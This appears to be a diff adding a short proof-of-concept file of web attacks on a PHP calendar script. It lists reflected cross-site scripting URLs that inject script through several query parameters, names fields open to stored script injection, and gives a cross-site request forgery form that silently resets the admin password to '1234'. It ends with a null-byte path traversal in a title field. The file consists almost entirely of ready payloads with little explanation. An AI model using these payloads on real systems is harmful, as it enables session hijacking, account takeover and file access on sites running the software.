@@ -1,0 +1,20 @@
+http://www.example.com/[DIR]/cl_files/index.php (POST/Login name)
+http://www.example.com/[DIR]/cl_files/index.php?page=a&amp;name=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/[DIR]/cl_files/index.php?CLd=21&amp;CLm=06&amp;CLy=2010&amp;name=[CALENDAR_NAME]&amp;type=list&amp;action=t&amp;page=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/[DIR]/cl_files/index.php?CLd=21&amp;CLm=06&amp;CLy=2010&amp;name=[CALENDAR_NAME]&amp;type=&amp;action=e&amp;err=&#039;%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C&#039;
+http://www.example.com/[DIR]/cl_files/index.php?CLd=23&amp;CLm=06&amp;CLy=2010%22%3E%3Cscript%3Ealert(1)%3C/script%3E&amp;name=[CALENDAR_NAME]&amp;type=&amp;action=e
+
+http://www.example.com/[DIR]/cl_files/index.php?page=e
+(Title; Body; Background color; Background image; Align;)
+
+http://www.example.com/[DIR]/cl_files/index.php?page=a
+Change &quot;Admin&quot; Password PoC:
+&lt;form name=user method=post action=&quot;http://www.example.com/[DIR]/cl_files/index.php?page=a&amp;name=[CALENDAR_NAME]&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;page&quot; value=&quot;a&quot;&gt;
+&lt;input type=hidden value=&quot;admin&quot; name=l class=inpt&gt;
+&lt;input type=hidden value=&quot;1234&quot; name=p class=inpt&gt;
+&lt;input type=hidden value=&quot;1234&quot; name=p2 class=inpt&gt;
+&lt;/form&gt;
+
+http://www.example.com/[DIR]/cl_files/index.php
+&quot;Title:&quot; \..\..\..\..\..\..\1.txt%00
